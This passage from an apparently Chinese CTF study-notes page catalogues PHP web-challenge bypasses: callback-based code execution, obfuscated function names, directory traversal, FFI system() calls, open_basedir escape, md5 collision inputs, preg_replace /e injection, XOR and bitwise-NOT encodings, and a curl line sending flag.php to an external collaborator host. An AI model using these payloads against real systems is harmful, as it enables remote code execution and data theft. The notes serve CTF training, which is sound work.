class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">mixed</span> <span class="variable">$parameter</span> [, <span class="keyword">mixed</span> $... ]] ) : <span class="keyword">mixed</span></span><br><span class="line">    第一个参数callback是被调用的回调函数，其余参数是回调函数的参数。</span><br><span class="line">    ?c=assert&amp;arg[]=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>()</span><br><span class="line">    <span class="comment"># 调用回调函数，并把一个数组参数作为回调函数的参数</span></span><br><span class="line">	<span class="title function_ invoke__">call_user_func_array</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> , <span class="keyword">array</span> <span class="variable">$param_arr</span> ) : <span class="keyword">mixed</span></span><br><span class="line">	把第一个参数作为回调函数callback调用，把参数数组作param_arr为回调函数的的参数传入。跟<span class="title function_ invoke__">array_map</span>()相似</span><br><span class="line">    ?c=assert&amp;arg[]=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">array_filter</span>()</span><br><span class="line">	<span class="comment">#用回调函数过滤数组中的单元</span></span><br><span class="line">    <span class="title function_ invoke__">array_filter</span> ( <span class="keyword">array</span> <span class="variable">$array</span> [, <span class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">int</span> <span class="variable">$flag</span> = <span class="number">0</span> ]] ) : <span class="keyword">array</span></span><br><span class="line">	依次将<span class="keyword">array</span>数组中的每个值传递到callback函数。</span><br><span class="line">    如果callback函数返回<span class="literal">true</span>，则<span class="keyword">array</span>数组的当前值会被包含在返回的结果数组中。</span><br><span class="line">    数组的键名保留不变。</span><br><span class="line">    ?arg[]=<span class="title function_ invoke__">phpinfo</span>()&amp;cmd=assert;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">usort</span>()</span><br><span class="line">    <span class="comment">#使用用户自定义的比较函数对数组中的值进行排序</span></span><br><span class="line">    <span class="title function_ invoke__">usort</span> ( <span class="keyword">array</span> &amp;<span class="variable">$array</span> , <span class="keyword">callable</span> <span class="variable">$value_compare_func</span> ) : <span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">_</span>() 等同于 <span class="title function_ invoke__">gettext</span>() 唯一有别名的函数</span><br><span class="line">    <span class="comment">#gettext()的拓展函数，开启text扩展(gettext)。</span></span><br><span class="line">    <span class="comment">#需要php扩展目录下有php_gettext.dll</span></span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>))</span><br><span class="line">    <span class="comment">#GET:f1=_&amp;f2=phpinfo</span></span><br></pre></td></tr></table></figure>

<h3 id="字符拼接绕过"><a href="#字符拼接绕过" class="headerlink" title="字符拼接绕过"></a>字符拼接绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a.b.c.d</span><br><span class="line">    <span class="comment"># 题目：eval(参数)</span></span><br><span class="line">    字符串拼接绕过适用于绕过过滤具体关键字的限制</span><br><span class="line">    适用PHP版本：PHP&gt;=<span class="number">7</span></span><br><span class="line">	<span class="comment"># 具体payload</span></span><br><span class="line">    (p.h.p.i.n.f.o)();</span><br><span class="line">    (sy.(st).em)(whoami);</span><br><span class="line">    (sy.(st).em)(who.ami);</span><br><span class="line">    (s.y.s.t.e.m)(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    .......</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在PHP中不一定需要<code>引号(单引号/双引号)</code>来表示字符串。PHP支持我们声明元素的类型，比如<code>$name = (string)mochu7;</code>，在这种情况下，<code>$name</code>就包含字符串<code>&quot;mochu7&quot;</code>，此外，如果不显示声明类型，那么PHP会将<code>圆括号内的数据当成字符串</code>来处理</p>
</blockquote>
<h3 id="字符串转义绕过"><a href="#字符串转义绕过" class="headerlink" title="字符串转义绕过"></a>字符串转义绕过</h3><blockquote>
<p>适用PHP版本：PHP&gt;=7</p>
</blockquote>
<p>以八进制表示的[0–7]{1,3}转义字符会自动适配byte（如”\400” == “\000”）<br>以十六进制的\x[0–9A-Fa-f]{1,2}转义字符表示法（如“\x41”）<br>以Unicode表示的\u{[0–9A-Fa-f]+}字符，会输出为UTF-8字符串</p>
<blockquote>
<p> 注意这里转义后的字符必须双引号包裹传参</p>
</blockquote>
<p>payload处理脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_payload</span>(<span class="params">payload</span>):</span><br><span class="line">	res_payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">		i = <span class="string">&quot;\\x&quot;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">		res_payload += i</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to hex: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oct_payload</span>(<span class="params">payload</span>):</span><br><span class="line">	res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">		i = <span class="string">&quot;\\&quot;</span> + <span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">		res_payload += i</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to oct: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uni_payload</span>(<span class="params">payload</span>):</span><br><span class="line">	res_payload = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">		i = <span class="string">&quot;\\u&#123;&#123;&#123;0&#125;&#125;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:])</span><br><span class="line">		res_payload += i</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[+]&#x27;&#123;&#125;&#x27; Convert to unicode: \&quot;&#123;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(payload,res_payload))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	payload = <span class="string">&#x27;phpinfo&#x27;</span></span><br><span class="line">	hex_payload(payload)</span><br><span class="line">	oct_payload(payload)</span><br><span class="line">	uni_payload(payload)</span><br></pre></td></tr></table></figure>





<h3 id="传参绕过总集–self"><a href="#传参绕过总集–self" class="headerlink" title="传参绕过总集–self"></a>传参绕过总集–self</h3><p>%0a相关参照<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108278486">点我</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php数学运算：</span></span><br><span class="line"><span class="number">1</span>. 四则运算：+-*/</span><br><span class="line"><span class="number">2</span>. 三元表达式：c?a:b</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 目录穿越漏洞</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">	GET:?f=../ctfshow/../../../../../../../<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line">	<span class="comment"># 解析到根目录路径，再找到flag目录即可</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># POP链</span></span><br><span class="line">就目前遇到的情况来说，是这样子的：调用出现的诸多类实现某个具体的功能，从而得到flag。</span><br><span class="line"></span><br><span class="line"><span class="comment">#PDO读取</span></span><br><span class="line"><span class="keyword">try</span>&#123;<span class="variable">$dbh</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span> (<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)&#123;<span class="keyword">echo</span> (<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;&#125;<span class="variable">$dbh</span>=<span class="literal">null</span>;&#125;<span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#FFI读取写入漏洞</span></span><br><span class="line"><span class="comment">// 要求版本是7.4以上</span></span><br><span class="line"><span class="comment">// 操作的具体流程是：</span></span><br><span class="line"><span class="comment">//  1.利用命令执行获取信息，并且写入到当前文件夹下的文本文件。</span></span><br><span class="line"><span class="comment">//  2.直接访问文本文件就能获取命令执行的信息</span></span><br><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//创建一个system对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//没有回显的</span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//通过$ffi去调用system函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 绕过open_basedir（目录锁死）</span></span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>(<span class="number">0</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># php插件注入绕过</span></span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$ffi</span>=FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="variable">$a</span> = <span class="string">&#x27;cat /flag &gt; /var/www/html/poc.txt&#x27;</span>;<span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="keyword">exit</span>();<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 避开缓冲区替换</span></span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment"># GET或者POST传入参数执行</span></span><br><span class="line">形如:</span><br><span class="line">GET:</span><br><span class="line">    http:<span class="comment">//xxx.xxx/index.php?name=zs&amp;passwd=123</span></span><br><span class="line">POST:</span><br><span class="line">    val=ww&amp;key=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 特殊传参--方括号变成下划线(参数解析漏洞)</span></span><br><span class="line">	POST: a[b.c=<span class="number">123</span></span><br><span class="line">	后台显示的参数名：</span><br><span class="line">	a_b.c=<span class="number">123</span></span><br><span class="line">            </span><br><span class="line">	PHP v5.<span class="number">6.40</span></span><br><span class="line">	?..CTFSHOW..=<span class="number">1</span>  =这个get传参等价于=&gt;  <span class="variable">$_GET</span>[__CTFSHOW__]=<span class="number">1</span></span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line"><span class="comment"># URL传参 -- 数字</span></span><br><span class="line">	<span class="comment"># 传参数字可以使用进制绕过，小数点，e科学计数法，加减法等方式绕过限制</span></span><br><span class="line">	<span class="comment"># URL编码解码可以使用php函数</span></span><br><span class="line"><span class="comment"># 约束攻击</span></span><br><span class="line">	<span class="comment"># 使用admin							1</span></span><br><span class="line">    <span class="comment"># 进行注册，如果发生截断为admin，使用admin登录即可直接获取admin权限</span></span><br><span class="line"><span class="comment"># %00 截断</span></span><br><span class="line">	形如：a=<span class="number">134</span>%<span class="number">20</span></span><br><span class="line">	形如：a=<span class="number">134</span>%<span class="number">00</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 双写绕过str_replace一次性限制</span></span><br><span class="line">    <span class="comment"># 意在只有调用一次限制</span></span><br><span class="line">            </span><br><span class="line"><span class="comment"># 空格传参绕过</span></span><br><span class="line">	 <span class="string">&quot;and&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;=&quot;</span>,<span class="string">&quot;\&quot;,&quot;</span>-<span class="string">&quot;,&quot;</span>&lt;&gt;<span class="string">&quot;																																				&quot;</span>别看我，我是用来保证代码着色的双引号</span><br><span class="line"></span><br><span class="line"><span class="comment"># 前端游戏绕过：</span></span><br><span class="line">	<span class="comment"># 白盒审计js，查看关键数据并且尝试绕过</span></span><br><span class="line">	<span class="comment"># 白盒审计+远程传参：将游戏数据传递给服务器，可以尝试解密游戏数据并重新发包</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 弱类型比较</span></span><br><span class="line">	<span class="comment">// 当数字和“数字字符串”进行比较时，比较的是数值，且仅前置的数字部分</span></span><br><span class="line">	<span class="number">1</span>==<span class="string">&#x27;1adasd&#x27;</span>  =&gt; <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># md5比较的绕过</span></span><br><span class="line">	<span class="title function_ invoke__">md5</span>(<span class="variable">$key1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$key2</span>)            <span class="comment">// 比较变量md5值是否相等</span></span><br><span class="line">	当md5编译的字符串返回结果以<span class="number">0</span>e开头时，弱类型对比下默认相等(==)</span><br><span class="line">	md5弱类型给出俩个例子：</span><br><span class="line">	s1885207154a</span><br><span class="line">    <span class="number">0e509367213418206700842008763514</span></span><br><span class="line">    s1836677006a</span><br><span class="line">    <span class="number">0e481036490867661113260034900752</span></span><br><span class="line">    s1665632922a</span><br><span class="line">    <span class="number">0e731198061491163073197128363787</span></span><br><span class="line">    s878926199a</span><br><span class="line">    <span class="number">0e545993274517709034328855841020</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数组绕过</span></span><br><span class="line">	a[]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># html实体编码转换</span></span><br><span class="line">	<span class="comment"># 方法很多，一般可以放到html当作直接转换显示，或者放到特定的转码器进行转码</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># php限制型函数集合</span></span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>():   <span class="comment">//检测传入是否数字，是字符串时返回false</span></span><br><span class="line">        <span class="comment">// 使用 == 和字符串进行绕过</span></span><br><span class="line">        <span class="number">1</span>. 十六进制+数组：j[]=<span class="number">58</span>B</span><br><span class="line">        <span class="number">2</span>. 空字符和<span class="number">00</span>截断绕过	</span><br><span class="line">            <span class="number">1315</span>%<span class="number">00</span> </span><br><span class="line">            <span class="number">1315</span>%<span class="number">20</span></span><br><span class="line">        <span class="number">3</span>. 字符串转数值型转换绕过：<span class="number">111</span>fff =&gt; <span class="number">111</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(正则,字符串): <span class="comment">//php的正则表达式限制</span></span><br><span class="line">        <span class="comment">// 使用不被限制的字符串进行绕过</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>();          <span class="comment">//截断输出函数</span></span><br><span class="line">        <span class="comment">// 在if等前置截断就使用各种条件进行绕过</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">str_replace</span>()   <span class="comment">//字符串替换函数，将字符串替换为指定字符串</span></span><br><span class="line">        <span class="comment">//双写绕过</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 某强类型绕过</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="comment"># 通过验证，则执行Linux命令(``这两个小点算是Linux的标志)</span></span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment"># a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数前面加个空格绕waf</span></span><br><span class="line">    <span class="comment"># 虽然搞不懂这是什么神仙操作，但却实能绕</span></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"><span class="comment"># 参数逃逸</span></span><br><span class="line">    <span class="comment">// 简单说明：参数逃逸的意思，是本身参数有一大堆限制，不能直接读取某些文件或者执行某些函数代码，</span></span><br><span class="line">    <span class="comment">// 这时候，只需要将参数带外出去，这样参数本身就能跳过被限制的字符串等，直接获取目标</span></span><br><span class="line">    形如：</span><br><span class="line">    某执行：<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);其中，对<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]有若干限制。</span><br><span class="line">    GET:?a=<span class="variable">$_POST</span>[<span class="number">1</span>]</span><br><span class="line">    POST:<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac /flag.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    c=<span class="variable">$pi</span>=<span class="variable">$_GET</span>[a](<span class="variable">$_GET</span>[b])&amp;a=system&amp;b=cat /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 玄学的数字绕过</span></span><br><span class="line"><span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span></span><br><span class="line">    <span class="comment"># 第一个会把%0c36当做字符串和&#x27;36&#x27;进行比较</span></span><br><span class="line">    <span class="comment"># 第二个会把%0c36当做数值36和&#x27;36&#x27;进行比较</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 思路：一个个函数进行尝试</span></span><br><span class="line">        <span class="comment"># 尝试的空字符是ascii码内的非明文字符</span></span><br><span class="line">        <span class="comment"># %0c==\f		ascii换页符</span></span><br><span class="line">    GET:?num=%<span class="number">0</span>c36</span><br><span class="line">        <span class="comment"># 居然满足了这个条件：$num!==&#x27;36&#x27; and $num==&#x27;36&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正则表达式溢出攻击</span></span><br><span class="line">	<span class="variable">$f</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	<span class="comment">#生成溢出字符串的代码：</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;very&#x27;</span>, <span class="string">&#x27;250000&#x27;</span>).<span class="string">&#x27;36Dctfshow&#x27;</span>;</span><br><span class="line">	<span class="comment">#放到传参即可</span></span><br><span class="line">	</span><br><span class="line"><span class="comment"># 数据带外访问 （DNSLOG或者BP某强大于DNSLOG的插件）</span></span><br><span class="line"><span class="comment"># payload </span></span><br><span class="line"><span class="comment">#其中-F 为带文件的形式发送post请求</span></span><br><span class="line"><span class="comment">#xx是上传文件的name值，flag.php就是上传的文件 </span></span><br><span class="line">?F=`<span class="variable">$F</span>`;+curl -X POST -F xx=@flag.php  http:<span class="comment">//uljnf26qzf4lmzmqgxfzhfeleck28r.burpcollaborator.net</span></span><br></pre></td></tr></table></figure>

<h3 id="PHP类方法调用"><a href="#PHP类方法调用" class="headerlink" title="PHP类方法调用"></a>PHP类方法调用</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">涉及的函数：<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[a])</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 静态调用：</span></span><br><span class="line">    ?a=ctfshow::<span class="variable constant_">getFlag</span></span><br><span class="line"><span class="comment"># 数组调用</span></span><br><span class="line">    ?a[<span class="number">0</span>]=ctfshow&amp;a[<span class="number">1</span>]=getFlag</span><br></pre></td></tr></table></figure>

<h3 id="PHP绕过preg-replace的-e模式"><a href="#PHP绕过preg-replace的-e模式" class="headerlink" title="PHP绕过preg_replace的\e模式"></a>PHP绕过preg_replace的\e模式</h3><p>这个没参考有些东西还真的考虑不到。利用字符串和动态的变量还有双引号可执行变量来绕过。</p>
<p>参考链接放下面：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">第一次启发是这位大佬：</span><br><span class="line">    https:<span class="comment">//www.cnblogs.com/HelloCTF/p/13184476.html#%E4%BE%8B%E4%B8%80</span></span><br><span class="line">第二次是自己想到了使用参数逃逸+本地测试</span><br><span class="line">    本地测试环境自己搭。</span><br><span class="line">    下面的部分是有些参考价值的，只不过没第一个多（个人看法）</span><br><span class="line">https:<span class="comment">//www.cnblogs.com/sipc-love/p/14289984.html</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/weixin_49656607/article/details/119833707</span></span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/2557</span></span><br></pre></td></tr></table></figure>



<p>例题：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pattern&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$pattern</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;pattern&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\`|read*|show|file|\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\/| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&amp;|\*|\%/i&quot;</span>,<span class="variable">$code</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span> . <span class="variable">$pattern</span> . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;print_r(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$code</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are smart&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;try again&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;it is begin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">?&gt;</span> &#125; </span><br></pre></td></tr></table></figure>

<p>绕过方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET: http:<span class="comment">//112.6.51.212:30995/?code=$&#123;eval($_POST[key])&#125;</span></span><br><span class="line">POST: pattern=.*&amp;key=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>: 当然是flag相关的内容啦，这里不赘述。</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="php按位取法运算符绕过限制"><a href="#php按位取法运算符绕过限制" class="headerlink" title="php按位取法运算符绕过限制 ~"></a>php按位取法运算符绕过限制 ~</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 依赖的PHP其实就这一个：</span></span><br><span class="line">$ php -r <span class="string">&quot;echo urlencode(~&#x27;cat f*&#x27;);&quot;</span></span><br><span class="line">%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%<span class="number">99</span>%D5</span><br><span class="line"></span><br><span class="line"><span class="comment">#在传参的时候调用是这样子的：</span></span><br><span class="line">a=(~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%<span class="number">99</span>%D5)</span><br></pre></td></tr></table></figure>



<h3 id="php异或非ascii与ascii绕过字母数字下划线限制"><a href="#php异或非ascii与ascii绕过字母数字下划线限制" class="headerlink" title="php异或非ascii与ascii绕过字母数字下划线限制"></a>php异或非ascii与ascii绕过字母数字下划线限制</h3><h4 id="脚本1-理解"><a href="#脚本1-理解" class="headerlink" title="脚本1+理解"></a>脚本1+理解</h4><p>无字母数字的还有另外一个参照，和下面的无关：<a target="_blank" rel="noopener" href="https://blog.csdn.net/a15803617402/article/details/83589181">https://blog.csdn.net/a15803617402/article/details/83589181</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#涉及的是web141 -- ctfshow</span></span><br><span class="line"><span class="variable">$v1</span>和<span class="variable">$v2</span> =&gt; 数字;</span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>);</span><br><span class="line"><span class="comment">#-------------------# 从原理上解题</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>(); ==&gt; 可以执行</span><br><span class="line"><span class="number">1</span>+<span class="title function_ invoke__">phpinfo</span>()+<span class="number">1</span>;==&gt; 也可执行</span><br><span class="line"><span class="number">1</span>+(<span class="string">&#x27;phpinfo&#x27;</span>)()+<span class="number">1</span>;==&gt; 依然可执行</span><br><span class="line">异或：XOR，^</span><br><span class="line"><span class="comment"># 异或的意思，就是相同就变化，不同就不变。下面的就是例子</span></span><br><span class="line"><span class="comment"># 这里的利用点：ascii码转16进制字符串（这个我是真没想到），再与超出ascii的十六进制值进行比较，得出异或值</span></span><br><span class="line"><span class="comment"># 只要使用ascii跟 %fa 异或，再用异或得到的值在传参是异或回来即可得到相应的页面值</span></span><br><span class="line"><span class="comment"># phpinfo =&gt; (%8A%92%8A%93%94%9C%95^%fa%fa%fa%fa%fa%fa%fa)</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#构造：</span></span><br><span class="line"><span class="comment">#=&gt;p</span></span><br><span class="line"><span class="comment"># 二进制数 十六进制数</span></span><br><span class="line"><span class="number">1111</span> <span class="number">1010</span> %fa <span class="comment"># 用来异或的超出ascii的字符</span></span><br><span class="line"><span class="number">1000</span> <span class="number">1010</span> %<span class="number">8</span>a <span class="comment"># 